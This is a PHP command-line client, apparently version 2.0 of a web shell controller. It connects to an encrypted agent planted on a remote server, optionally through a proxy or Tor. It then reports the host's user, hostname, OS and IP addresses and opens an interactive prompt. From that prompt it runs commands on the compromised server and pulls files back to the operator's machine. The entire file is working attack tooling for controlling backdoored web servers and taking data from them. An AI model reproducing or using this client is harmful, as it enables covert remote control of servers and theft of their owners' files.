#!/usr/bin/env php
<?php
include './functions.php';
include './banners.php';

$version = "2.0";

print_welcome($version);

if (count($argv) == 1) {
    echo "\n [-] I need a json file containing the settings. \n\n";
    exit(-1);
}

$file = $argv[1];

if (!is_readable($file)) {
    echo "\n [-] Hey! I can't read that file no_O\n\n";
    exit(-1);
}

// Read our config file
$config = json_decode(file_get_contents($file), true);
if (!is_json_valid($config)) {
    echo "\n [-] That config file is not valid! (╯°□°)╯︵ ┻━┻\n\n";
    exit(-1);
}
echo " [+] The json file is valid.\n";

$key      = trim($config['key']);
$url      = trim($config['url']);
$login    = trim($config['login']['username']);
$password = trim($config['login']['password']);
$proxy    = array();

if (isset($config['proxy'])) {
    echo " [+] We're going to use a proxy.\n";
    $proxy = $config['proxy'];
}

$cookies = null;

if (isset($config['cookies'])) {
    $cookies = $config['cookies'];
}

$username    = '';
$path        = '';
$hostname    = '';
$php_version = '';
$os          = '';
$info        = '';
$time        = '';
$ip          = '';
$client_ip   = '';
$tools       = array();

$continue = false;

echo " [+] Trying to connect... ";

$result = send_request($url, array('i' => base64_encode('ping')), $login, $password, $proxy, $cookies);

if ($result['status'] != 200) {
    echo "Failed, agent not found.\n";
    exit(-1);
}

echo "Good.\n";
echo " [+] Let's parse the host information... ";

if(strpos($result['content'],'captcha') > -1) {
    echo "Failed, some Captcha was found, try to reset the Tor circuit...\n";
} elseif (strpos($result['content'],'openssl_encrypt') > -1){
    echo "Failed, the Target doesn't Encryption.\n";
} else {
    $response    = json_decode(decrypt($result['content'], $key), true);
    $username    = $response['user'];
    $path        = $response['path'];
    $hostname    = $response['hostname'];
    $php_version = $response['php'];
    $os          = $response['os'];
    $info        = $response['server'];
    $time        = $response['time'];
    $ip          = $response['ip'];
    $client_ip   = $response['client_ip'];
    $tools       = explode('|', $response['tools']);
    echo "Done.\n";
    unset($response);
}

echo " [+] Opening the shell... \n";

sleep(1);

print_banner();

echo "\n";
echo "\e[37mServer IP\t:=\e[0m \e[97m{$ip}\e[0m\t\n\e[37mClient IP\t:=\e[0m \e[97m{$client_ip}\e[0m\n";
echo "\e[37mTime @ Server\t:=\e[0m \e[97m{$time}\e[0m\n";
echo "\e[37mInformation\t:=\e[0m \e[97m".strtoupper($os)."\e[0m\n";
echo "\e[37mWeb Server\t:=\e[0m \e[97m".strtoupper($info)."\e[0m\n";
echo "\n";

do {
    $prefix = "\e[91m{$username}\e[0m@\e[33m{$hostname}\e[0m:\e[94m{$path}\e[0m$ ";
    $line   = readline($prefix);
    $cmd    = trim(str_replace(array(
        "\n",
        "\r"
    ), '', $line));
    if ($cmd != 'exit' && strlen($cmd) > 0) {
        $data = make_request($cmd, $path, $key);
        if (!isset($data['c']) && !isset($data['f'])) {
            continue;
        }
        $result = send_request($url, $data, $login, $password, $proxy, $cookies);
        if ($result['status'] == 200) {
            $decrypted_content = decrypt($result['content'], $key);
            $response          = json_decode($decrypted_content, true);
            $path              = base64_decode($response['path']);
            $files             = $response['files'];
            if(!is_null($files)){
                foreach ($files as $file) {
                    $content  = $file['content'];
                    $download = base64_to_file($content, getcwd(), basename($file['name']));
                    echo " [+] File \e[94m{$download}\e[0m was downloaded successfully.\n";
                }
            }
            echo base64_decode($response['output']);
        } else {
            echo "\n\tWe received {$result['status']} instead of 200 ¯\_(ツ)_/¯\n\n";
        }
    }
} while (strtolower($cmd) != 'exit');
